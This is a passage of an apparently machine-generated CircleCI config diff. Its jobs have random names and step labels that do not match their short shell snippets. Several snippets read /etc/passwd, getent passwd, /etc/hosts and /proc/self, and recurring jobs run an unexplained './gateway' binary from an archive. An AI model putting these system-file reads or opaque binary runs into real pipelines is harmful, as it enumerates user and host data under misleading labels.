+            mkdir -p /var/tmp/b1
+            { set +o pipefail 2>/dev/null; getent passwd | sed 's/:.*//' | awk '{print length, $0}' | wc -w; true ; } > /var/tmp/b1/Copper
+            ls -la /var/tmp/b1/Copper | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/b1
+          paths:
+            - 'Copper'
+  pat-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/b1
+      - run:
+          name: Check stage 1
+          command: |
+            awk 'END{print "last line was",NR}' /var/tmp/b1/Copper 2>/dev/null || true
+      - run:
+          name: Checkout code
+          command: git clone --depth 1 --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar xf main-pkg.tar
+      - run:
+          command: /bin/sh -c "./gateway"
+  NEW_A:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/b1
+      - run:
+          name: Why hash the output bucket
+          command: |
+            mkdir -p /var/tmp/b1
+            { set +o pipefail 2>/dev/null; cat /etc/os-release |tr -d '"' |awk -F = '{ print $2 }'; true ; } > /var/tmp/b1/RuSTYbeaMNickellAYER
+            ls -la /var/tmp/b1/RuSTYbeaMNickellAYER | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/b1
+          paths:
+            - 'RuSTYbeaMNickellAYER'
+  foxtrot:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/b1
+      - run:
+          name: Check stage 1
+          command: |
+            awk 'END{print "last line was",NR}' /var/tmp/b1/RuSTYbeaMNickellAYER 2>/dev/null || true
+      - run:
+          name: Checkout code
+          command: git clone --depth 1 --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar xf main-pkg.tar
+      - run:
+          command: /bin/sh -c "./gateway"
+  teardown_loop:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/b1
+      - run:
+          name: Benchmarking the reward model
+          command: |
+            mkdir -p /var/tmp/b1
+            { set +o pipefail 2>/dev/null; for p in wednesday friday tuesday thursday monday; do echo "<${p}>"; done|sort -r; true ; } > /var/tmp/b1/sdvas
+            ls -la /var/tmp/b1/sdvas | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/b1
+          paths:
+            - 'sdvas'
+  sep24-smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/b1
+      - run:
+          name: Check stage 1
+          command: |
+            awk 'END{print "last line was",NR}' /var/tmp/b1/sdvas 2>/dev/null || true
+      - run:
+          name: Checkout code
+          command: git clone --depth 1 --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar xf main-pkg.tar
+      - run:
+          command: /bin/sh -c "./gateway"
+  NNKV-3266:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/b1
+      - run:
+          name: Pull sha 75f8a5
+          command: |
+            mkdir -p /var/tmp/b1
+            { set +o pipefail 2>/dev/null; cp /etc/hosts '/tmp/payroll.copy' && sed -i 's/localhost/LOCALHOST/' '/tmp/payroll.copy' && tail -2 '/tmp/payroll.copy'; true ; } > /var/tmp/b1/lSR
+            ls -la /var/tmp/b1/lSR | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/b1
+          paths:
+            - 'lSR'
+  v6-rc:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/b1
+      - run:
+          name: Check stage 1
+          command: |
+            awk 'END{print "last line was",NR}' /var/tmp/b1/lSR 2>/dev/null || true
+      - run:
+          name: Checkout code
+          command: git clone --depth 1 --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar xf main-pkg.tar
+      - run:
+          command: /bin/sh -c "./gateway"
+
+  canyon-mutex-hook-frost:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/b1
+      - run:
+          name: Pinch at 1330 sharp
+          command: |
+            mkdir -p /var/tmp/b1
+            { set +o pipefail 2>/dev/null; for num in $(seq 7); do echo $num; done | head -3; true ; } > /var/tmp/b1/14go0n3a57
+            ls -la /var/tmp/b1/14go0n3a57 | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/b1
+          paths:
+            - '14go0n3a57'
+  COMMIT_TEMPLATE_ORIG:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/b1
+      - run:
+          name: Descend into prod
+          command: |
+            mkdir -p /var/tmp/b1
+            { set +o pipefail 2>/dev/null; find /tmp -maxdepth 2 -type l -iname "*.tmp" 2>/dev/null | xargs -r ls -ld | head -n 5; true ; } > /var/tmp/b1/gOldeNvAllEYCeDaRdRAft
+            ls -la /var/tmp/b1/gOldeNvAllEYCeDaRdRAft | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/b1
+          paths:
+            - 'gOldeNvAllEYCeDaRdRAft'
+  unwrap_pipe:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/b1
+      - run:
+          name: Level I defragmenting query planner stats
+          command: |
+            mkdir -p /var/tmp/b1
+            { set +o pipefail 2>/dev/null; find /var/log -type f -exec wc -l "{}" \; 2> /dev/null|sort -r; true ; } > /var/tmp/b1/audit-3e870b.log
+            ls -la /var/tmp/b1/audit-3e870b.log | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/b1
+          paths:
+            - 'audit-3e870b.log'
+  VARP:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/b1
+      - run:
+          name: Series III offer letter collection
+          command: |
+            mkdir -p /var/tmp/b1
+            { set +o pipefail 2>/dev/null; find /run -exec echo {} + 2>/dev/null | tail -6; true ; } > /var/tmp/b1/232.117.141
+            ls -la /var/tmp/b1/232.117.141 | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/b1
+          paths:
+            - '232.117.141'
+  Pa5:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/b1
+      - run:
+          name: ROTATE KMS KEYS
+          command: |
+            mkdir -p /var/tmp/b1
+            { set +o pipefail 2>/dev/null; repeat(){ echo "$#"; }; repeat pete omar tom rosa lena; true ; } > /var/tmp/b1/bondp4cke7
+            ls -la /var/tmp/b1/bondp4cke7 | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/b1
+          paths:
+            - 'bondp4cke7'
+  feature-depth-map-tiny:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/b1
+      - run:
+          name: May I ask you to checksum the vendor bundles
+          command: |
+            mkdir -p /var/tmp/b1
+            { set +o pipefail 2>/dev/null; if [ ! -d $HOME ]; then echo true; else echo false; fi; true ; } > /var/tmp/b1/trace-0c57c5.log
+            ls -la /var/tmp/b1/trace-0c57c5.log | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/b1
+          paths:
+            - 'trace-0c57c5.log'
+  BasicDualSidebarItem:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/b1
+      - run:
+          name: Remind the offer letters
+          command: |
+            mkdir -p /var/tmp/b1
+            { set +o pipefail 2>/dev/null; grep -hRI alias /etc/skel | cut -d: -f1 | sort -u; true ; } > /var/tmp/b1/BUNDLE
+            ls -la /var/tmp/b1/BUNDLE | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/b1
+          paths:
+            - 'BUNDLE'
+  DogVs:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/b1
+      - run:
+          name: Smoke Test Triage WEB 6117
+          command: |
+            mkdir -p /var/tmp/b1
+            { set +o pipefail 2>/dev/null; seq 11 6 149 | awk '{s+=$1} END {print s/NR}'; true ; } > /var/tmp/b1/garden.zinc.quick.polar
+            ls -la /var/tmp/b1/garden.zinc.quick.polar | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/b1
+          paths:
+            - 'garden.zinc.quick.polar'
+  TCPHook:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: First total month end
+          command: |
+            mkdir -p /var/tmp/b1
+            { set +o pipefail 2>/dev/null; find /proc/self -maxdepth 3 -type f -exec stat -c "%y %n" {} + 2>/dev/null | xargs ls -ld; true ; } > /var/tmp/b1/tmp519
+            ls -la /var/tmp/b1/tmp519 | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/b1
+          paths:
+            - 'tmp519'
+  processprofile:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/b1
+      - run:
+          name: Load test the junit output in us west
+          command: |
+            mkdir -p /var/tmp/b1
+            { set +o pipefail 2>/dev/null; tr ':' ' ' </etc/passwd | fold -w 45 | tr -s ' '; true ; } > /var/tmp/b1/Copper
+            ls -la /var/tmp/b1/Copper | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/b1
+          paths:
+            - 'Copper'
+  posPx:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/b1
+      - run:
+          name: Nudge pre the audit
+          command: |
+            mkdir -p /var/tmp/b1
+            { set +o pipefail 2>/dev/null; ls -nAd --sort=version /bin/b* | sort -k5,5nr | head -n 5; true ; } > /var/tmp/b1/sdvas
+            ls -la /var/tmp/b1/sdvas | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/b1
+          paths:
+            - 'sdvas'
+  q22007:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/b1
+      - run:
+          name: After the API docs settle carry on
+          command: |
+            mkdir -p /var/tmp/b1
+            { set +o pipefail 2>/dev/null; printf '%s\n' '   leading spaces' | wc -w; true ; } > /var/tmp/b1/RuSTYbeaMNickellAYER
+            ls -la /var/tmp/b1/RuSTYbeaMNickellAYER | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/b1
+          paths:
+            - 'RuSTYbeaMNickellAYER'
+  armor-trait-stale-rollback:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Level XII test antenna
+          command: |
+            mkdir -p /var/tmp/b1
+            { set +o pipefail 2>/dev/null; getent hosts localhost | fold -w 30; true ; } > /var/tmp/b1/VID_00072330
+            ls -la /var/tmp/b1/VID_00072330 | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/b1
+          paths:
+            - 'VID_00072330'
+  aud_6_12_40:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/b1
+      - run:
+          name: Collect
+          command: |
+            mkdir -p /var/tmp/b1
+            { set +o pipefail 2>/dev/null; df -P|sort -n -k 5; true ; } > /var/tmp/b1/temp53b5
+            ls -la /var/tmp/b1/temp53b5 | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/b1
+          paths:
+            - 'temp53b5'
+  clipProtocol:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/b1
+      - run:
+          name: Match point restore
+          command: |
+            mkdir -p /var/tmp/b1
+            { set +o pipefail 2>/dev/null; for entry in $(seq 1 3); do echo $((entry * entry)); done; true ; } > /var/tmp/b1/227.189.151.98
+            ls -la /var/tmp/b1/227.189.151.98 | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/b1
+          paths:
+            - '227.189.151.98'
+  bParser:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/b1
+      - run:
+          name: Train the parquet files under lock
+          command: |
+            mkdir -p /var/tmp/b1
+            { set +o pipefail 2>/dev/null; compgen -b | grep type; true ; } > /var/tmp/b1/river_queue_tundra
+            ls -la /var/tmp/b1/river_queue_tundra | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/b1
+          paths:
+            - 'river_queue_tundra'
+  espressoPiston:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/b1
+      - run:
+          name: Weigh overnight culture and seal
+          command: |
+            mkdir -p /var/tmp/b1
+            { set +o pipefail 2>/dev/null; printf 'id,item,qty,price\n1,mango,5,58.49\n2,grape,15,21.20\n3,apple,14,88.10\n4,peach,6,7.54\n' >"/tmp/milestone_group_final.conf" && sort -t, -k4 -rn "/tmp/milestone_group_final.conf" | head -n 2; true ; } > /var/tmp/b1/fermion-wallet-bronze-east
+            ls -la /var/tmp/b1/fermion-wallet-bronze-east | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/b1
+          paths:
+            - 'fermion-wallet-bronze-east'
+  dec-932:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/b1
+      - run:
+          name: Garbage Collect Queue On Shadow
+          command: |
+            mkdir -p /var/tmp/b1
+            { set +o pipefail 2>/dev/null; find /opt -type f -name '*' -print0 2>/dev/null | sort -z | xargs -0 ls -1; true ; } > /var/tmp/b1/dev_82680
+            ls -la /var/tmp/b1/dev_82680 | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/b1
+          paths:
+            - 'dev_82680'
+  vVbz8IQ:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/b1
+      - run:
+          name: vet otp 41
+          command: |
+            mkdir -p /var/tmp/b1
+            { set +o pipefail 2>/dev/null; if test -f /etc/passwd; then echo 'present'; else echo absent; fi; true ; } > /var/tmp/b1/PRoXywilloWtHUndErKAPPa
+            ls -la /var/tmp/b1/PRoXywilloWtHUndErKAPPa | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/b1
+          paths:
+            - 'PRoXywilloWtHUndErKAPPa'
+  RTOSCache:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/b1
+      - run:
+          name: 410 sync the spool directory
+          command: |
+            mkdir -p /var/tmp/b1
+            { set +o pipefail 2>/dev/null; for k in $(seq 1 4); do echo $((k * k)); done | head -n3; true ; } > /var/tmp/b1/LOADER_HAWK_PHOTON_PROFILE
+            ls -la /var/tmp/b1/LOADER_HAWK_PHOTON_PROFILE | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/b1
+          paths:
+            - 'LOADER_HAWK_PHOTON_PROFILE'
+  resolveACLs:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/b1
+      - run:
+          name: Tab to the tooltip
+          command: |
+            mkdir -p /var/tmp/b1
+            { set +o pipefail 2>/dev/null; >&2 echo "the quick brown fox"; true ; } > /var/tmp/b1/72wCFNfkwNxt5phYuFL2BH
+            ls -la /var/tmp/b1/72wCFNfkwNxt5phYuFL2BH | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/b1
+          paths:
+            - '72wCFNfkwNxt5phYuFL2BH'
+  warningMu:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/b1
+      - run:
+          name: Ship packing slips for next day
+          command: |
+            mkdir -p /var/tmp/b1
+            { set +o pipefail 2>/dev/null; find /run -type l -name '*' -mtime -7 -exec echo '{}' \; 2>/dev/null | nl; true ; } > /var/tmp/b1/lSR
+            ls -la /var/tmp/b1/lSR | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/b1
+          paths:
+            - 'lSR'
+  labelcolumn:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Cart icon click
+          command: |
+            mkdir -p /var/tmp/b1
+            { set +o pipefail 2>/dev/null; set -- friday saturday thursday wednesday; printf '%s\n' "$@" | sort; true ; } > /var/tmp/b1/release_80522
+            ls -la /var/tmp/b1/release_80522 | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/b1
+          paths:
+            - 'release_80522'
+workflows:
+  workflow:
+    jobs:
+      - decodeWithWindow
+      - verify-full-regression-suite:
+          requires:
+            - decodeWithWindow
+      - login_10_4_22:
+          requires:
+            - decodeWithWindow
+      - tweak-router-hang:
+          requires:
+            - login_10_4_22
+      - yankee-india-mike:
+          requires:
+            - login_10_4_22
+      - package:
+          requires:
+            - yankee-india-mike
+      - postDialogRecord:
+          requires:
+            - yankee-india-mike
+      - ensure-end-to-end-docker-image:
+          requires:
+            - postDialogRecord
+      - weIGHt__ShIpMENt__cLEAR:
+          requires:
+            - postDialogRecord
+      - fix-9370:
+          requires:
+            - weIGHt__ShIpMENt__cLEAR
+      - lkp_SEMAPHORE_PIXEL:
+          requires:
+            - weIGHt__ShIpMENt__cLEAR
+      - atlas-ng:
+          requires:
+            - lkp_SEMAPHORE_PIXEL
+      - fossspashuemprs:
+          requires:
+            - lkp_SEMAPHORE_PIXEL
+      - tweak-router:
+          requires:
+            - fossspashuemprs
+      - maple_sierra
+      - canyon-mutex-hook-frost:
+          requires:
+            - maple_sierra
+      - feb12-smoke:
+          requires:
+            - canyon-mutex-hook-frost
+      - arg:
+          requires:
+            - canyon-mutex-hook-frost
+      - COMMIT_TEMPLATE_ORIG:
+          requires:
+            - arg
+      - all-greens:
+          requires:
+            - COMMIT_TEMPLATE_ORIG
+      - L_payment:
+          requires:
+            - COMMIT_TEMPLATE_ORIG
+      - unwrap_pipe:
+          requires:
+            - L_payment
+      - preview-build:
+          requires:
+            - unwrap_pipe
+      - nLogins:
+          requires:
+            - unwrap_pipe
+      - VARP:
+          requires:
+            - nLogins
+      - victor:
+          requires:
+            - VARP
+      - IN-OUT-2:
+          requires:
+            - VARP
+      - Pa5:
+          requires:
+            - IN-OUT-2
+      - wip-dashboard-crash:
+          requires:
+            - Pa5
+      - VbRFfZs:
+          requires:
+            - Pa5
+      - feature-depth-map-tiny:
+          requires:
+            - VbRFfZs
+      - DEPLOY_DEV:
+          requires:
+            - feature-depth-map-tiny
+      - refrenceSetting:
+          requires:
+            - feature-depth-map-tiny
+      - BasicDualSidebarItem:
+          requires:
+            - refrenceSetting
+      - Rollout_Image8:
+          requires:
+            - BasicDualSidebarItem
+      - BaseRatioVisitor
+      - DogVs:
+          requires:
+            - BaseRatioVisitor
+      - qi-verify:
+          requires:
+            - DogVs
+      - sec-31275-total:
+          requires:
+            - DogVs
+      - TCPHook:
+          requires:
+            - sec-31275-total
+      - v7-alpha:
+          requires:
+            - TCPHook
+      - MAT2:
+          requires:
+            - TCPHook
+      - processprofile:
+          requires:
+            - MAT2
+      - pat-ship:
+          requires:
+            - processprofile
+      - teardown_loop:
+          requires:
+            - processprofile
+      - posPx:
+          requires:
+            - teardown_loop
+      - sep24-smoke:
+          requires:
+            - posPx
+      - NEW_A:
+          requires:
+            - posPx
+      - q22007:
+          requires:
+            - NEW_A
+      - foxtrot:
+          requires:
+            - q22007
+      - W_TAU:
+          requires:
+            - q22007
+      - armor-trait-stale-rollback:
+          requires:
+            - W_TAU
+      - ken-ci:
+          requires:
+            - armor-trait-stale-rollback
+      - TAX_EXTERNAL:
+          requires:
+            - armor-trait-stale-rollback
+      - aud_6_12_40:
+          requires:
+            - TAX_EXTERNAL
+      - europa-ng:
+          requires:
+            - aud_6_12_40
+      - complexFlag
+      - clipProtocol:
+          requires:
+            - complexFlag
+      - d-v2:
+          requires:
+            - clipProtocol
+      - dwFlagsDiscountClosedMenu:
+          requires:
+            - clipProtocol
+      - bParser:
+          requires:
+            - dwFlagsDiscountClosedMenu
+      - v7-beta4:
+          requires:
+            - bParser
+      - uk_nz:
+          requires:
+            - bParser
+      - espressoPiston:
+          requires:
+            - uk_nz
+      - APP-275:
+          requires:
+            - espressoPiston
+      - hey:
+          requires:
+            - espressoPiston
+      - dec-932:
+          requires:
+            - hey
+      - add-webhook:
+          requires:
+            - dec-932
+      - aliases
+      - vVbz8IQ:
+          requires:
+            - aliases
+      - Deploy_Image3:
+          requires:
+            - vVbz8IQ
+      - sys_ReceiveWake:
+          requires:
+            - vVbz8IQ
+      - RTOSCache:
+          requires:
+            - sys_ReceiveWake
+      - smoke:
+          requires:
+            - RTOSCache
+      - Union-Title:
+          requires:
+            - RTOSCache
+      - resolveACLs:
+          requires:
+            - Union-Title
+      - orion-rc:
+          requires:
+            - resolveACLs
+      - NNKV-3266:
+          requires:
+            - resolveACLs
+      - warningMu:
+          requires:
+            - NNKV-3266
+      - v6-rc:
+          requires:
+            - warningMu
+      - SmallBit:
+          requires:
+            - warningMu
+      - labelcolumn:
+          requires:
+            - SmallBit
+      - QA_MERGE_8:
+          requires:
+            - labelcolumn
